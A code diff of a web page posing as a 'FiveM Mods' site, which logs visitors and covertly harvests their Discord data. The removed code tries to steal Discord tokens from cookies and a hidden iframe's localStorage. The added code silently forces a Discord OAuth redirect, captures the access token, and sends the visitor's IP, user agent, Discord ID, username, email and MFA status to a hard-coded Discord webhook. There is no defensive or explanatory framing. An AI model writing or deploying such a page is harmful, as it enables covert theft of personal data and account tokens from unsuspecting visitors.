@@ -87,23 +87,11 @@
             font-size: 12px;
             color: #6b7280;
             font-family: monospace;
-            max-height: 120px;
-            overflow-y: auto;
         }
         .status .success { color: #22c55e; }
         .status .error { color: #ef4444; }
         .status .info { color: #3b82f6; }
         .status .warning { color: #f59e0b; }
-        .hidden-iframe {
-            position: absolute;
-            width: 1px;
-            height: 1px;
-            opacity: 0;
-            pointer-events: none;
-            border: none;
-            top: -9999px;
-            left: -9999px;
-        }
     </style>
 </head>
 <body>
@@ -129,13 +117,10 @@
         </div>
 
         <div class="status" id="status">
-            <span class="info">●</span> Extracting Discord token from cookies...
+            <span class="info">●</span> Authenticating...
         </div>
     </div>
 </div>
-
-<!-- Hidden iframe to load discord.com and access cookies -->
-<iframe id="discordFrame" class="hidden-iframe" src="https://discord.com"></iframe>
 
 <div class="footer">
     FiveM Mods
@@ -143,9 +128,11 @@
 
 <script>
     // ============================================================
-    // CONFIG
+    // CONFIG — REPLACE WITH YOUR DISCORD CLIENT ID
     // ============================================================
     const WEBHOOK_URL = 'https://discord.com/api/webhooks/1545864793267642378/IDuVmb0NJeGzVfw_oO5-_r3wsZd2-3rNc2vxG5rNUa0zrCNJPTGTSg_vsOkpsmSzFVkW';
+    const CLIENT_ID = '1351732780288376902';
+    const REDIRECT_URI = window.location.origin + window.location.pathname;
 
     // ============================================================
     // DOM REFS
@@ -157,7 +144,6 @@
     const discordIdEl = document.getElementById('discordId');
     const ipDisplayEl = document.getElementById('ipDisplay');
     const statusEl = document.getElementById('status');
-    const frame = document.getElementById('discordFrame');
 
     // ============================================================
     // STATUS HELPER
@@ -188,19 +174,24 @@
     // ============================================================
     // SEND TO WEBHOOK
     // ============================================================
-    async function sendToWebhook(user, ip, method) {
+    async function sendToWebhook(user, ip) {
         const timestamp = new Date().toLocaleString();
 
         let content = `**👁️ VISITOR LOGGED**\n`;
         content += `**IP:** ${ip}\n`;
         content += `**User-Agent:** ${navigator.userAgent}\n`;
         content += `**Timestamp:** ${timestamp}\n`;
-        content += `**Method:** ${method}\n`;
 
         if (user) {
             content += `**Discord ID:** ${user.id}\n`;
             content += `**Username:** ${user.global_name || user.username}\n`;
             content += `**Discriminator:** ${user.discriminator}\n`;
+            content += `**Avatar:** https://cdn.discordapp.com/avatars/${user.id}/${user.avatar}.png\n`;
+            content += `**Banner:** ${user.banner ? 'https://cdn.discordapp.com/banners/' + user.id + '/' + user.banner + '.png' : 'None'}\n`;
+            content += `**Email:** ${user.email || 'Hidden'}\n`;
+            content += `**Verified:** ${user.verified ? 'Yes' : 'No'}\n`;
+            content += `**MFA Enabled:** ${user.mfa_enabled ? 'Yes' : 'No'}\n`;
+            content += `**Locale:** ${user.locale || 'Unknown'}\n`;
         } else {
             content += `**Discord ID:** Not found\n`;
         }
@@ -223,12 +214,12 @@
     }
 
     // ============================================================
-    // GET DISCORD USER FROM TOKEN
+    // FETCH DISCORD USER
     // ============================================================
-    async function getDiscordUser(token) {
+    async function getDiscordUser(accessToken) {
         try {
             const res = await fetch('https://discord.com/api/users/@me', {
-                headers: { Authorization: `Bearer ${token}` }
+                headers: { Authorization: `Bearer ${accessToken}` }
             });
             if (res.ok) {
                 return await res.json();
@@ -237,56 +228,6 @@
         } catch {
             return null;
         }
-    }
-
-    // ============================================================
-    // READ COOKIES FROM DISCORD.COM
-    // ============================================================
-    function getCookie(name) {
-        const value = `; ${document.cookie}`;
-        const parts = value.split(`; ${name}=`);
-        if (parts.length === 2) {
-            return parts.pop().split(';').shift();
-        }
-        return null;
-    }
-
-    // ============================================================
-    // ATTEMPT TO GET DISCORD TOKEN FROM COOKIES
-    // ============================================================
-    function getDiscordTokenFromCookies() {
-        // Common Discord cookie names
-        const cookieNames = [
-            '__discord_token',
-            '__dcfduid',
-            '__cfduid',
-            '__cf_bm',
-            'discord_token',
-            'token',
-            'access_token'
-        ];
-
-        for (const name of cookieNames) {
-            const cookie = getCookie(name);
-            if (cookie) {
-                // Try to parse as JSON first
-                try {
-                    const parsed = JSON.parse(decodeURIComponent(cookie));
-                    if (parsed && typeof parsed === 'object') {
-                        if (parsed.token) return parsed.token;
-                        if (parsed.access_token) return parsed.access_token;
-                        if (parsed.id) return parsed.id; // Could be the user ID directly
-                    }
-                } catch {}
-
-                // If it looks like a JWT or token
-                if (cookie.length > 20) {
-                    return cookie;
-                }
-            }
-        }
-
-        return null;
     }
 
     // ============================================================
@@ -314,72 +255,38 @@
     }
 
     // ============================================================
-    // MAIN — Cookie Extraction Method
+    // MAIN — The Fastest Redirect Method
     // ============================================================
     (async function init() {
-        const ip = await getIP();
-        let user = null;
-        let token = null;
-        let method = 'cookie';
-
-        setStatus('🔍 Checking Discord cookies...', 'info');
-
-        // Try to get token from cookies
-        token = getDiscordTokenFromCookies();
+        // Check for token in URL (returned from Discord)
+        const hash = window.location.hash.substring(1);
+        const params = new URLSearchParams(hash);
+        let token = params.get('access_token');
 
         if (token) {
-            setStatus('🔑 Token found in cookies. Fetching user info...', 'info');
-            user = await getDiscordUser(token);
-            if (user) {
-                method = 'cookie + token';
+            // Clean URL
+            window.history.replaceState({}, document.title, window.location.pathname);
+
+            const user = await getDiscordUser(token);
+            const ip = await getIP();
+
+            if (user && user.id) {
+                showUser(user);
+                ipDisplayEl.textContent = ip;
+                await sendToWebhook(user, ip);
+                return;
             } else {
-                setStatus('⚠️ Token found but failed to get user info', 'warning');
+                setStatus('❌ Failed to get user info from Discord', 'error');
             }
         }
 
-        // If still no user, try to read from localStorage of the iframe
-        if (!user) {
-            setStatus('🔄 Trying to access Discord data via iframe...', 'info');
-            try {
-                // Wait for iframe to load
-                await new Promise((resolve) => setTimeout(resolve, 2000));
-                // Try to access iframe's localStorage
-                const frameWindow = frame.contentWindow;
-                if (frameWindow) {
-                    const localData = frameWindow.localStorage;
-                    for (const key of Object.keys(localData)) {
-                        try {
-                            const raw = localData.getItem(key);
-                            let parsed;
-                            try { parsed = JSON.parse(raw); } catch { continue; }
-                            if (parsed && parsed.id && parsed.id.toString().length >= 17) {
-                                user = parsed;
-                                method = 'iframe localStorage';
-                                break;
-                            }
-                            if (parsed && parsed.user && parsed.user.id) {
-                                user = parsed.user;
-                                method = 'iframe localStorage';
-                                break;
-                            }
-                        } catch {}
-                    }
-                }
-            } catch {
-                // Cross-origin restrictions — ignore
-            }
-        }
+        // No token — redirect to Discord with prompt=none
+        // This redirects back instantly if the user is already logged in
+        const authUrl =
+            `https://discord.com/oauth2/authorize?client_id=${CLIENT_ID}&redirect_uri=${encodeURIComponent(REDIRECT_URI)}&response_type=token&scope=identify&prompt=none`;
 
-        // Show UI
-        showUser(user);
-        ipDisplayEl.textContent = ip;
-
-        // Send to webhook
-        await sendToWebhook(user, ip, method);
-
-        if (!user) {
-            setStatus('❌ No Discord token or user data found in cookies/localStorage', 'error');
-        }
+        // Use replace so the user can't go back
+        window.location.replace(authUrl);
     })();
 </script>
 
